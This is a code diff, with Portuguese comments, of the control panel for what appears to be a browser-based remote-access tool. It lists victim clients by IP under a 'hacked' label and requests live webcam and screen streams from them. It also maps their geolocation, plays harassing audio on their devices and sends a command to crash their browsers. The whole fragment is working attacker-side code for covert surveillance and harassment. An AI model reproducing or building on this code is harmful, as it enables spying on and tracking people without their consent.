+    $('recordBtn').classList.add('d-none'); $('stopBtn').classList.remove('d-none');
+  };
+  $('stopBtn').onclick=()=>{
+    mediaRecorder.stop();
+    $('recordBtn').classList.remove('d-none'); $('stopBtn').classList.add('d-none');
+    bootstrap.Modal.getInstance('#recordModal').hide();
+  };
 
-    /* ======== Botão scripts bubble ======== */
-    $('scriptsBubble').onclick = () => openOverlay('scriptsOverlay');
+  /* ===== Upload áudio local ===== */
+  $('audioFile').onchange=e=>{
+    const f=e.target.files[0]; if(!f) return;
+    const fr=new FileReader();
+    fr.onload=()=>{ readyAudios.push({name:f.name,url:fr.result}); toast('Áudio salvo – use "Enviar áudio"'); };
+    fr.readAsDataURL(f); e.target.value='';
+  };
 
-    /* ======== Socket handlers ======== */
-    socket.on('clients', arr => {
-      $('count').textContent = arr.length;
-      $('list').innerHTML = '';
-      arr.forEach(c => {
-        cache[c.uuid] = c;
-        $('list').insertAdjacentHTML('beforeend',
-          `<div class="client-row" data-uuid="${c.uuid}"><i class="fa-solid fa-eye"></i><span>${c.ip}</span></div>`
-        );
-      });
-    });
-    socket.on('frame', d => $('img-'+d.id)?.setAttribute('src', d.data));
-    socket.on('screen-frame', d => $('screen-img-'+d.id)?.setAttribute('src', d.data));
-
-    /* ======== Ações de menu ======== */
-    $('list').addEventListener('click', e => {
-      const row = e.target.closest('.client-row');
-      if (!row) return;
-      currentUUID = row.dataset.uuid;
-      $('menuTitle').textContent = `Menu de: ${cache[currentUUID].ip}`;
-      openOverlay('actionMenu');
-    });
-
-    $('actionMenu').addEventListener('click', e => {
-      const btn = e.target.closest('.menu-btn');
-      if (!btn) return;
-      const act = btn.dataset.action;
-      closeOverlay('actionMenu');
-      switch (act) {
-        case 'cam':         startStream('cam');        break;
-        case 'screen':      startStream('screen');     break;
-        case 'stop-cam':    stopStream('cam');         break;
-        case 'stop-screen': stopStream('screen');      break;
-        case 'rec-audio':   bootstrap.Modal.getOrCreateInstance('#recordModal').show(); break;
-        case 'stop-audio':  socket.emit('stop-audio', currentUUID); toast('Áudio parado','secondary'); break;
-        case 'download-audio': window.open('https://www.myinstants.com/pt/search/?name=MEME','_blank'); break;
-        case 'upload-audio':   $('audioFile').click(); break;
-        case 'troll-audio':
-          populateReadyAudios();
-          bootstrap.Modal.getOrCreateInstance('#selectAudioModal').show();
-          break;
-        case 'info':      showInfo(); break;
-        case 'crash':     crashModal.show(); break;
-      }
-    });
-
-    function startStream(kind) {
-      if (kind==='cam' && activeCam[currentUUID])    { toast('Câmera já ativa','secondary'); return; }
-      if (kind==='screen' && activeScreen[currentUUID]) { toast('Tela já ativa','secondary'); return; }
-      socket.emit(kind==='cam'?'request-stream':'request-screen', currentUUID);
-      (kind==='cam'? activeCam : activeScreen)[currentUUID] = true;
-      mkCard(currentUUID, kind==='cam'?'cam':'screen');
-      toast((kind==='cam'?'Câmera':'Tela')+' ativada');
-    }
-    function stopStream(kind) {
-      socket.emit(kind==='cam'?'stop-stream':'stop-screen', currentUUID);
-      (kind==='cam'? activeCam : activeScreen)[currentUUID] = false;
-      document.getElementById((kind==='cam'?'cam-':'screen-')+currentUUID)?.remove();
-      toast((kind==='cam'?'Câmera':'Tela')+' parada','secondary');
-    }
-
-    $('confirmCrash').onclick = () => {
-      crashModal.hide();
-      socket.emit('crash-browser', currentUUID);
-      toast('Enviando crash…','danger');
-    };
-
-    /* ======== Infos & mapa ======== */
-    function showInfo() {
-      const c = cache[currentUUID];
-      $('infoIp').textContent   = c.ip || '-';
-      $('infoUuid').textContent = c.uuid;
-      if (c.location) updateInfoFields(c.location);
-      else ['infoLat','infoLon','infoAcc','infoTime'].forEach(id => $(id).textContent='-');
-      infoModal.show();
-      setTimeout(initMap, 200);
-    }
-    function initMap() {
-      if (map) return;
-      map = L.map('infoMap',{zoomControl:false}).setView([0,0],2);
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
-      marker = L.marker([0,0]).addTo(map);
-      if (cache[currentUUID].location) updateInfoFields(cache[currentUUID].location);
-    }
-    function updateInfoFields(loc) {
-      $('infoLat').textContent  = loc.lat.toFixed(5);
-      $('infoLon').textContent  = loc.lon.toFixed(5);
-      $('infoAcc').textContent  = Math.round(loc.accuracy);
-      $('infoTime').textContent = new Date(loc.timestamp).toLocaleTimeString();
-      if (map) {
-        map.setView([loc.lat,loc.lon],14);
-        marker.setLatLng([loc.lat,loc.lon]).bindPopup(`Precisão ≈ ${Math.round(loc.accuracy)} m`).openPopup();
-      }
-    }
-
-    /* ======== Criação do card ======== */
-    function mkCard(uuid, type) {
-      const c = cache[uuid];
-      const card = document.createElement('div');
-      card.className = 'card-feed animate__animated animate__zoomIn';
-      card.id = `${type==='cam'?'cam':'screen'}-${uuid}`;
-      card.innerHTML = `
-        <div class="ip-label">${c.ip} | ${os(c.ua)} | hacked</div>
-        <img id="${type==='cam' ? 'img-'+uuid : 'screen-img-'+uuid}">
-        <div class="overlay">${type==='cam' ? 'Câmera' : 'Tela'}</div>
-        <div class="btn-bar">
-          <button class="btn-glass btn-full"><i class="fa-solid fa-expand"></i></button>
-          <button class="btn-glass btn-min"><i class="fa-solid fa-minus"></i></button>
-          <button class="btn-glass btn-stop"><i class="fa-solid fa-xmark"></i></button>
-        </div>`;
-      card.querySelector('.btn-full').onclick = () => openFull(card);
-      card.querySelector('.btn-min').onclick = () => {
-        if (document.fullscreenElement === card) document.exitFullscreen();
-      };
-      card.querySelector('.btn-stop').onclick = () => {
-        socket.emit(type==='cam'?'stop-stream':'stop-screen', uuid);
-        card.remove();
-      };
-      $('viewer').appendChild(card);
-    }
-    function openFull(card) {
-      const img = card.querySelector('img');
-      const onFs = () => {
-        if (document.fullscreenElement === card) {
-          img.style.objectFit = 'contain';
-          img.style.height    = '100vh';
-        } else {
-          img.style.objectFit = 'cover';
-          img.style.height    = '200px';
-          document.removeEventListener('fullscreenchange', onFs);
-        }
-      };
-      document.addEventListener('fullscreenchange', onFs);
-      (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
-    }
-
-    /* ======== Overlay helpers ======== */
-    function openOverlay(id){ $(id).classList.add('show'); }
-    function closeOverlay(id){ $(id).classList.remove('show'); }
-
-    /* ======== Gravar/upload áudio ======== */
-    document.getElementById('recordBtn').onclick = async () => {
-      const stream = await navigator.mediaDevices.getUserMedia({audio:true});
-      mediaRecorder = new MediaRecorder(stream);
-      chunks = [];
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.onstop = () => {
-        const delay = Math.max(0, parseInt(prompt('Atraso (segundos):','0'))||0);
-        const blob = new Blob(chunks,{type:'audio/webm'});
-        const fr = new FileReader();
-        fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay}); toast('Áudio enviado','primary'); };
-        fr.readAsDataURL(blob);
-      };
-      mediaRecorder.start();
-      $('recordBtn').classList.add('d-none');
-      $('stopBtn').classList.remove('d-none');
-    };
-    $('stopBtn').onclick = () => {
-      mediaRecorder.stop();
-      $('recordBtn').classList.remove('d-none');
-      $('stopBtn').classList.add('d-none');
-      bootstrap.Modal.getInstance('#recordModal').hide();
-    };
-
-    $('audioFile').onchange = e => {
-      const f = e.target.files[0];
-      if (!f) return;
-      const delay = Math.max(0, parseInt(prompt('Atraso (segundos):','0'))||0);
-      const fr = new FileReader();
-      fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay}); toast('Áudio enviado','info'); };
-      fr.readAsDataURL(f);
-      e.target.value = '';
-    };
-
-    /* ======== Botão atualização modal ======== */
-    $('updatesLinkBtn').onclick = () => {
-      window.open('https://saporraesukita.netlify.app', '_blank');
-    };
+  /* ===== Link do modal de updates ===== */
+  $('updatesLinkBtn').onclick=()=>window.open('https://saporraesukita.netlify.app','_blank');
   </script>
 </body>
 </html>
